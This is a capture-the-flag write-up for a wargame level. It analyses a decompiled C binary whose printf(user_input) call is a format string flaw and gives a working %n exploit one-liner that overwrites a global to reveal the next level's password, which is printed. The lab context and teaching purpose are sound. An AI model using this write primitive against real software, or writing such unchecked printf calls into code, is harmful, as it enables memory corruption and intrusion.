# Level 4: Format String Exploitation - The Sequel

## Challenge Overview

Level4 continues where level3 left off, presenting another format string vulnerability. This time we need to write the value (0x1025544) to a global variable to reveal the password for the next level.

## Source Code Analysis

Using Ghidra, we get a source code of the binary that looks like this:

```c
#include <stdio.h>
#include <stdlib.h>

// Global variable at address 0x08049810
int target_value = 0;

void print_string(char *user_input)
{
  printf(user_input);
  return;
}

void get_user_input(void)
{
  char buffer[520];

  fgets(buffer, 0x200, stdin);
  print_string(buffer);
  if (target_value == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

int main(void)
{
  get_user_input();
  return 0;
}
```

## The Vulnerability

The vulnerability is in the `print_string()` function which directly passes user input to `printf()` without format specifiers. This creates a format string vulnerability that allows us to read from and write to memory.

## The Exploitation Strategy

### 1. Finding the Target Address

First, we need to determine the memory address of the `target_value` global variable:

- Through Ghidra analysis, we identified it at address 0x08049810

### 2. Locating Parameter Positions

We need to determine where our address will be positioned in the printf parameter list:

```bash
(python -c 'print "\x10\x98\x04\x08" + "%p %p %p %p %p %p %p %p %p %p %p %p"') | ./level4
```

Output:

```
0xb7ff26b0 0xbffff684 0xb7fd0ff4 (nil) (nil) 0xbffff648 0x804848d 0xbffff440 0x200 0xb7fd1ac0 0xb7ff37d0 0x8049810
```

This shows our target address at position 12.

### 3. Exploit strategy

We'll use the format string vulnerability to:

1. Place the target address at the beginning of our input
2. Use the direct parameter access feature (`%n$`) to make printf write to that address
3. Print exactly 16,930,116 characters (decimal for 0x1025544) before the write operation

The `%n` format specifier writes the number of characters printed so far to the address specified by the corresponding argument.

### 4. The Complete Exploit

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112c%12$n"') | ./level4
```

This command:

1. Places the address (0x08049810) at the beginning of the input
2. Uses the `%16930112c` format to print 16,930,112 characters
3. The 4 bytes from our address at the beginning add 4 more characters, bringing the total to 16,930,116
4. Finally, `%12$n` writes this count (16,930,116 = 0x1025544) to the 12th argument, which is our target address

When this exploit runs successfully, the condition `target_value == 0x1025544` becomes true, and we get the password for level5:

```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
